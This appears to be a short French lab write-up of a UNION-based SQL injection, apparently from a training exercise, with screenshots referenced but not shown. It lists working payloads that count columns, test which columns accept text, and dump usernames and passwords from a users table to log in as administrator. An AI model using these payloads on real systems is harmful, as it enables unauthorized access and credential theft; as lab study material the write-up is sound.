
![](../../Img/Pasted%20image%2020260722155909.png)
Pour chercher les credentials pour nous connecter dans la base de données , on va tout simplement chercher il y a combien de columns et lesquelles acceptent les strings 

' ORDER BY 1--
'+ORDER+BY+1--
![](../../Img/Pasted%20image%2020260722155921.png)
il n'y a que 2 columns.

on va chercher mtn laquelle accepte du text
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
'+UNION+SELECT+'a',NULL--
'+UNION+SELECT+NULL,'a'--
![](../../Img/Pasted%20image%2020260722155930.png)
![](../../Img/Pasted%20image%2020260722155938.png)
les 2 acceptent le texte


on va chercher les mots username et password de la table users mtn pour faire apparaitre l'admin et se log 

' UNION SELECT username,password FROM users--
'+UNION+SELECT+username,password+FROM+users--
![](../../Img/Pasted%20image%2020260722155953.png)
![](Pasted%20image%2020260722155959.png)
On a put voir diff users et mdp mais on va se concentrer sur celui qui a le username administrator
![](../../Img/Pasted%20image%2020260722160008.png)
on va se log 
![](../../Img/Pasted%20image%2020260722160015.png)
et voilà on a réussit 
